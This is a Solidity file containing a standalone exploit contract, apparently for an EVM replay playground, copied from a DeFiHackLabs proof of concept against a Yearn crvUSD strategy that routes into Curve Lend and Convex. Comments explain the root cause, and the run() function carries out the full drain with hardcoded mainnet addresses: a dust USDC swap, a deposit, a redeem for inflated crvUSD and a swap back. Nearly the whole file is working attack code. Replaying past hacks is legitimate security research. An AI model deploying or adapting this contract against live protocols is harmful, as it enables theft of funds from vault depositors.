// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-07-StrategyLlamaLendConvex).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (testExploit() calls deposit()/redeem() directly on the strategy as address(this),
// with no standalone exploit contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/StrategyLlamaLendConvex_exp.sol.
//
// Root cause: A tiny crvUSD deposit into the Yearn strategy is routed into a Curve
// Lend vault and staked in Convex. Redeeming the minted strategy shares causes the
// strategy to unstake and redeem far more crvUSD from the Curve Lend vault than was
// deposited — the permissionless deposit/redeem path trusts the underlying Curve
// Lend vault's share accounting and passes through the realized withdrawal skew,
// letting the redeemer receive hundreds of crvUSD for a dust-sized deposit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ITokenizedStrategy {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

interface ICurveStableSwap {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract StrategyLlamaLendConvexDrain {
    address constant STRATEGY = 0x75b7DB3e11138134fe4744553b5e5e3D6546d289;
    address constant CRVUSD_TOKEN = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
    address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant CRVUSD_USDC_CURVE_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;

    // step 0: seed with a dust USDC amount (mirrors deal(USDC_TOKEN, address(this), 124)
    // in the Foundry test) and run the full attack sequence.
    function run() external {
        uint256 seedUsdc = IERC20(USDC_TOKEN).balanceOf(address(this));

        // step 1: swap the dust USDC seed into crvUSD, matching the trace's seed funding.
        IERC20(USDC_TOKEN).approve(UNISWAP_V3_ROUTER, seedUsdc);
        uint256 crvUsdSeed = Uni_Router_V3(UNISWAP_V3_ROUTER).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams({
                tokenIn: USDC_TOKEN,
                tokenOut: CRVUSD_TOKEN,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: seedUsdc,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // step 2: deposit the crvUSD into the strategy; the minted shares are derived here.
        IERC20(CRVUSD_TOKEN).approve(STRATEGY, crvUsdSeed);
        uint256 strategyShares = ITokenizedStrategy(STRATEGY).deposit(crvUsdSeed, address(this));

        // step 3: redeem the just-minted strategy shares and receive the inflated crvUSD output.
        ITokenizedStrategy(STRATEGY).redeem(strategyShares, address(this), address(this));
        uint256 crvUsdRedeemed = IERC20(CRVUSD_TOKEN).balanceOf(address(this));

        // step 4: convert the crvUSD proceeds back to USDC through the same Curve pool.
        IERC20(CRVUSD_TOKEN).approve(CRVUSD_USDC_CURVE_POOL, crvUsdRedeemed);
        ICurveStableSwap(CRVUSD_USDC_CURVE_POOL).exchange(1, 0, crvUsdRedeemed, 0);
    }
}
